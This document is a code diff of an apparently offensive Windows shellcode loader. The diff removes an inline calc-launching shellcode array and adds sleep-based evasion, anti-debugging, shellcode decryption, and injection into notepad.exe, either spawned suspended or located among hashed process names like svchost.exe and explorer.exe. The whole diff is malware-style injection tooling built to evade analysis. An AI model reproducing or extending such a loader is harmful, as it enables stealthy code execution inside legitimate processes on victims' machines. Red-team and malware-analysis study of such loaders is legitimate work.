@@ -10,36 +10,55 @@
 VOID entry(void)
 {
 	DWORD	pid = 0;
-	HANDLE	process_handle = NULL;
-	// unsigned char shellcode[] = EncryptShellcode(CONFIG_PAYLOAD_SHELLCODE, CONFIG_ENCRYPT_KEY, sizeof(shellcode), sizeof(CONFIG_ENCRYPT_KEY));
-	// unsigned char shellcode[] = CONFIG_PAYLOAD_SHELLCODE;
-	unsigned char shellcode[] = {
-		0x31,0xc0,0x50,0x68,0x63,0x61,0x6c,0x63,0x54,0x59,0x50,0x40,0x92,0x74,0x15,
-		0x51,0x64,0x8b,0x72,0x2f,0x8b,0x76,0x0c,0x8b,0x76,0x0c,0xad,0x8b,0x30,0x8b,
-		0x7e,0x18,0xb2,0x50,0xeb,0x1a,0xb2,0x60,0x48,0x29,0xd4,0x65,0x48,0x8b,0x32,
-		0x48,0x8b,0x76,0x18,0x48,0x8b,0x76,0x10,0x48,0xad,0x48,0x8b,0x30,0x48,0x8b,
-		0x7e,0x30,0x03,0x57,0x3c,0x8b,0x5c,0x17,0x28,0x8b,0x74,0x1f,0x20,0x48,0x01,
-		0xfe,0x8b,0x54,0x1f,0x24,0x0f,0xb7,0x2c,0x17,0x8d,0x52,0x02,0xad,0x81,0x3c,
-		0x07,0x57,0x69,0x6e,0x45,0x75,0xef,0x8b,0x74,0x1f,0x1c,0x48,0x01,0xfe,0x8b,
-		0x34,0xae,0x48,0x01,0xf7,0x99,0xff,0xd7
-	}; // win-exec-calc-shellcode.bin
+	HANDLE	process_handle = INVALID_HANDLE_VALUE;
 
+	// unsigned char shellcode[] = EncryptShellcode(CONFIG_PAYLOAD_SHELLCODE, CONFIG_ENCRYPT_KEY, sizeof(shellcode), sizeof(CONFIG_ENCRYPT_KEY));
+
+#pragma region Evasion
+
+#if SLEEP_ENABLED
+	SleepMethod(SLEEP_TIME);
+#else
+#endif
+
+//#if ANTI_SANDBOX_ENABLED
+//#else
+//#endif
+
+#if ANTI_DEBUG_ENABLED
+	malapi::HideFromDebugger();
+#else
+#endif
+
+#pragma endregion
+
+#pragma region Decrypt
+
+	DecryptShellcode(shellcode, sizeof(shellcode), key, sizeof(key));
+
+#pragma endregion
+
+#if CONFIG_CREATE_PROCESS
+	LPCSTR file_path = "C:\\Windows\\System32\\notepad.exe";
+	process_handle = malapi::CreateSuspendedProcess((LPSTR)file_path);
+#else
 	constexpr ULONG targets[] = {
 		malapi::HashStringFowlerNollVoVariant1a("notepad.exe"),
-		malapi::HashStringFowlerNollVoVariant1a("werfault.exe"),
-		malapi::HashStringFowlerNollVoVariant1a("explorer.exe"),
 		malapi::HashStringFowlerNollVoVariant1a("svchost.exe"),
+		malapi::HashStringFowlerNollVoVariant1a("explorer.exe"),
+		malapi::HashStringFowlerNollVoVariant1a("werfault.exe"),
 	};
 
 	pid = malapi::GetPidFromHashedList((DWORD*)targets, 1);
+
 	if (pid == NULL)
 	{
 		LOG_ERROR("Error getting Process ID.");
 		return;
 	}
 	LOG_SUCCESS("Process ID: %d", pid);
-
 	process_handle = malapi::GetProcessHandle(pid);
+#endif
 
 	if (!ExecuteShellcode(process_handle, shellcode, sizeof(shellcode)))
 	{
